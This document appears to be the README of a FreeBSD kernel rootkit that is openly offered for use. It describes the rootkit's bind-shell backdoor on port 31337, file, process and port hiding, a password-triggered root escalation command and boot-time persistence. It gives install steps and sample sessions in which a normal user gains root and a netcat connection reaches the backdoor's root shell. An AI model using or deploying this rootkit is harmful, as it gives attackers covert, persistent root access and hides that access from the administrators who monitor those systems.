============BDS KLD ROOTKIT

Freebsd KLD Rootkit for FreeBSD 13. Hide files, hide process, hide port, bind shell backdoor
Developed by : Antonius
Website : www.bluedragonsec.com
Github : https://github.com/bluedragonsecurity
Twitter : https://twitter.com/bluedragonsec

===Features

Bind shell on port 31337
Bind shell process hiding
Hide file with prefix bds
Hide bind shell port
Privilege escalation with password

===Installation

You need root privilege, make and gcc to install this rootkit. To install just type :
./install.sh

====Using the Rootkit

==Privilege Escalation
Once the rootkit installed on the system, in case you lost root privilege, you can regain root privilege by typing :
_________________________________________
  /sbin/bds_shell bluedragonsec
_________________________________________

Typing above command will make you regain root privilege :

_________________________________________
robotsoft@robotsoft ~> id
uid=1002(robotsoft) gid=1002(robotsoft) groups=1002(robotsoft),0(wheel),5(operator)
robotsoft@robotsoft ~> /sbin/bds_shell bluedragonsec
root@robotsoft:~ # id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
root@robotsoft:~ # 

_________________________________________

==Connecting to Bind Shell Backdoor
Connecting to bind shell on a freebsd server which you have installed this rootkit can be accomplished simply by using netcat :

_________________________________________
nc (server ip) 31337
_________________________________________

For example, freebsd server with rootkit installed is at 192.168.0.141 :


_________________________________________
root@robotsoft ~# nc 192.168.0.141 31337
FreeBSD robotsoft 13.2-STABLE FreeBSD 13.2-STABLE GENERIC amd64
sh: turning off NDELAY mode
id
uid=0(root) gid=0(wheel) groups=0(wheel)
pwd
/
_________________________________________

==Hiding Files and Directories

To hide file and directory just give prefix bds to file name and directory name

==Process Hiding 

This rootkit hides bind shell process from ps.

==Port Hiding

This rootkit hides bind shell port from netstat.

==Persistence

The rootkit is activated every time the system starts up. After the reboot, wait for 1 minute, the rootkit will be loaded into kernel.
